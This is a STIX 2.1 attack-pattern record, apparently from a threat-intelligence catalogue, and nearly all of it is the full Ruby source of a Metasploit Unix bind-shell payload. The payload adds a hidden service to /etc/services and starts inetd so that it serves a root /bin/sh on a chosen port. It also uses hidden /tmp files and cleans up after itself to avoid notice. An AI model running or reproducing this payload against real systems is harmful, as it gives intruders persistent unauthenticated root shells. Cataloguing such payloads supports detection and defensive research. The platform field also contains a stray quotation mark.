{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f2f36a18-8190-4a63-82de-656a42aa3a13",
    "created": "2024-08-14T16:33:19.327173Z",
    "modified": "2024-08-14T16:33:19.327177Z",
    "name": "Unix Command Shell, Bind TCP (inetd)",
    "description": "Listen for a connection and spawn a command shell (persistent)",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/singles/cmd/unix/bind_inetd.rb",
            "external_id": "bind_inetd.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 487\n\n  include Msf::Payload::Single\n  include Msf::Sessions::CommandShellOptions\n\n  def initialize(info = {})\n    super(merge_info(info,\n     'Name'          => 'Unix Command Shell, Bind TCP (inetd)',\n     'Description'   => 'Listen for a connection and spawn a command shell (persistent)',\n     'Author'        => 'hdm',\n     'License'       => MSF_LICENSE,\n     'Platform'      => 'unix',\n     'Arch'          => ARCH_CMD,\n     'Handler'       => Msf::Handler::BindTcp,\n     'Session'       => Msf::Sessions::CommandShell,\n     'PayloadType'   => 'cmd',\n     'Privileged'    => true,\n     'RequiredCmd'   => 'inetd',\n     'Payload'       =>\n       {\n         'Offsets' => { },\n         'Payload' => ''\n       }\n    ))\n    register_advanced_options(\n      [\n        OptString.new('InetdPath', [true, 'The path to the inetd executable', 'inetd']),\n        OptString.new('ShellPath', [true, 'The path to the shell to execute', '/bin/sh'])\n      ]\n    )\n  end\n\n  #\n  # Constructs the payload\n  #\n  def generate(_opts = {})\n    vprint_good(command_string)\n    return super + command_string\n  end\n\n  #\n  # Returns the command string to use for execution\n  #\n  def command_string\n    tmp_services = \"/tmp/.\" + Rex::Text.rand_text_alpha(32)\n    tmp_inet = \"/tmp/.\" + Rex::Text.rand_text_alpha(32)\n    svc = Rex::Text.rand_text_alpha_lower(9)\n\n    cmd =\n      # Create a clean copy of the services file\n      \"cp /etc/services #{tmp_services};\" +\n\n        # Add our service to the system one\n        \"echo #{svc} #{datastore['LPORT']}/tcp>>/etc/services;\" +\n\n        # Create our inetd configuration file with our service\n        \"echo #{svc} stream tcp nowait root #{datastore['ShellPath']} sh>#{tmp_inet};\" +\n\n        # First we try executing inetd without the full path\n        \"#{datastore['InetdPath']} -s #{tmp_inet} ||\" +\n\n        # Next try the standard inetd path on Linux, Solaris, BSD\n        \"/usr/sbin/inetd -s #{tmp_inet} ||\" +\n\n        # Next try the Irix inetd path\n        \"/usr/etc/inetd -s #{tmp_inet};\" +\n\n        # Overwrite services with the \"clean\" version\n        \"cp #{tmp_services} /etc/services;\" +\n\n        # Delete our configuration file\n        \"rm #{tmp_inet} #{tmp_services};\";\n\n    return cmd\n  end\nend\n",
    "x_mitre_platforms": [
        "unix'"
    ]
}